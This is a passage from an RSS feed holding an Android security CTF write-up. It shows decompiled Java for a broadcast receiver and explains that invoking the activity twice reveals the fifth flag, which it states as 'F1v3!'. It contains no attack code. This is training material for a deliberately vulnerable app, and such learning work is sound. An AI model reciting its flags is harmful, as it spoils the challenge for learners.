            sb&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;append&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;C2765h&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m809e&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;\n    Action: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; intent&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;getAction&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;\n\n    &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;));&lt;/span&gt;
            sb&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;append&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;C2765h&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m809e&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;\n    URI: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; intent&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;toUri&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;\n\n    &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;));&lt;/span&gt;
            str &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; sb&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
            C2724g&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m882d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;str&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;sb.toString()&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            Log&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;DUDE!:&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; str&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
            str &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;Keep trying!&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;i2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;!=&lt;/span&gt; 1&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
                &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;i2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; 2&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
                    &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; FlagsOverview&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4087H&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
                    &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; ApplicationC1492j&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4065b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;flagFiveButtonColor&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
                    Toast&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;makeText&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;You are a winner &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; C1494k&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4061a&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;Zkdlt0WwtLQ=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;),&lt;/span&gt; 1&lt;span style=&#34;color:#5bc4bf&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;show&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
                    i &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
                    f4410a &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
                &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
                Toast&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;makeText&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; str&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; 1&lt;span style=&#34;color:#5bc4bf&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;show&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
                &lt;span style=&#34;color:#815ba4&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
        Toast&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;makeText&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; str&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; 1&lt;span style=&#34;color:#5bc4bf&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;show&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
        i &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; f4410a &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; 1&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
        f4410a &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;onReceive&lt;/strong&gt; method is responsible for receiving intents sent. Invoking our Activity two times we get a flag.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/androidsec/flag5.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/androidsec/flag5.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Flag Five&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Flag Five&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The flag for challenge five is &lt;strong&gt;F1v3!&lt;/strong&gt;&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
